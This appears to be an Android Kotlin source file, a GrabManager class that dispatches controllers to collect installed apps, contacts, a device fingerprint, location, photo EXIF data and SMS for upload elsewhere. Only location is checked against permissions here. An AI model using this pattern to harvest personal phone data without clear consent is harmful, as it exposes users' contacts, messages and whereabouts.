package com.qit.india

import android.Manifest
import android.content.Context
import com.qit.applist.AppListController
import com.qit.base.GrabController
import com.qit.base.GrabType.Companion.TYPE_APP_LIST
import com.qit.base.GrabType.Companion.TYPE_DEVICE_FINGER
import com.qit.base.GrabType.Companion.TYPE_PHONE_BOOK
import com.qit.base.GrabType.Companion.TYPE_TIME_PHOTO_LIST
import com.qit.base.GrabType.Companion.TYPE_TIME_SMS_LIST
import com.qit.base.GrabType.Companion.TYPE_UPLOCAD_LOCATION
import com.qit.contact.ContactController
import com.qit.device.DeviceController
import com.qit.exif.ExifController
import com.qit.location.LocationController
import com.qit.sms.SmsController
import pub.devrel.easypermissions.EasyPermissions


class GrabManager(private val context: Context, private val listener: GrabController.GrabListener) {
    private fun <T : GrabController> getData(controller: T, type: Int) {
        controller.registerListener(type, listener)
    }

    fun getAllGrab(appListCondition: () -> Boolean = { true },
                   contactCondition: () -> Boolean = { true },
                   deviceCondition: () -> Boolean = { true },
                   locationCondition: () -> Boolean = { true }) {
        getAppList(appListCondition)
        getContact(contactCondition)
        getDevice(deviceCondition)
        getLocation(locationCondition)
    }

    private fun getAppList(appListCondition: () -> Boolean = { true }) {
        if (appListCondition()) getData(AppListController(context), TYPE_APP_LIST)
    }

    private fun getContact(contactCondition: () -> Boolean = { true }) {
        if (contactCondition()) getData(ContactController(context), TYPE_PHONE_BOOK)
    }

    private fun getDevice(deviceCondition: () -> Boolean = { true }) {
        if (deviceCondition()) getData(DeviceController(context), TYPE_DEVICE_FINGER)
    }

    private fun getLocation(locationCondition: () -> Boolean = { true }) {
        if (EasyPermissions.hasPermissions(context,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION) && locationCondition()) getData(
            LocationController(context),
            TYPE_UPLOCAD_LOCATION)
    }

    private fun getExif(exifCondition: () -> Boolean = { true }) {
        if (exifCondition()) getData(ExifController(context), TYPE_TIME_PHOTO_LIST)
    }

    private fun getSms(smsCondition: () -> Boolean = { true }) {
        if (smsCondition()) getData(SmsController(context), TYPE_TIME_SMS_LIST)
    }
}